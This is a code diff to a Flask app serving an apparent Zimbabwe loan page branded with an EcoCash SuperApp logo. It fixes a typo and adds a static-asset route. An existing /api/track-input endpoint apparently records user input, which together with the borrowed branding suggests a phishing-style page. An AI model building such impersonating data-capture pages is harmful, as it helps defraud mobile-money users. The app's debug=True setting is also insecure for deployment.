@@ -223,7 +223,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
   <!-- MAIN WRAPPER -->
   <main class="w-full max-w-[760px] mx-auto px-4 py-2 flex-1">
 
-    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="/assets/logo.jpg" alt="EcoCash SupperApp" class="h-20 w-auto mx-auto mb-4">    <h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Zimbabwe • Digital Loans</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">Keshagi Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief delivered to your EcoCash.</p>
+    <!-- SCREEN 1: HOME --><section id="screen-home" class="space-y-4"><div class="text-center"><img src="/assets/logo.jpg" alt="EcoCash SuperApp" class="h-20 w-auto mx-auto mb-4">    <h2 class="text-xs tracking-widest font-bold text-[#004F71] uppercase">Zimbabwe • Digital Loans</h2><h1 class="text-3xl sm:text-4xl font-extrabold text-[#004F71] mt-1 tracking-tight uppercase">Keshagi Loans</h1><p class="text-slate-600 text-sm mt-1">Instant, flexible financial relief delivered to your EcoCash.</p>
       </div>
 
       <!-- 4 Benefits -->
@@ -1084,6 +1084,12 @@ def save_unified():
 @app.route('/api/track-input', methods=['POST'])
 def track_input():
     return save_unified()
+from flask import send_from_directory
+
+@app.route('/assets/<path:filename>')
+def serve_assets(filename):
+    return send_from_directory('assets', filename)
+
 
 if __name__ == "__main__":
     app.run(debug=True, port=int(os.environ.get("PORT", 8000)))
